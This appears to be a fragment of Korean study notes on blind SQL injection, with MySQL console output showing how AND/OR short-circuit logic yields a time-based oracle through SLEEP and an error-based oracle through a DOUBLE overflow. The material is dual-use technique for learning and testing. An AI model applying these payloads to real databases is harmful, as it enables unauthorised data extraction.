로직 원리를 이용해 공격하는 방법 또한 존재함

SELECT 0 AND SLEEP(1);
+----------------+
| 0 AND SLEEP(1) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)

SELECT 1 AND SLEEP(10);
+-----------------+
| 1 AND SLEEP(10) |
+-----------------+
|               0 |
+-----------------+
1 row in set (10.04 sec)


mysql> SELECT 1=1 or 9e307*2;
+----------------+
| 1=1 or 9e307*2 |
+----------------+
|              1 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1=0 or 9e307*2;
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'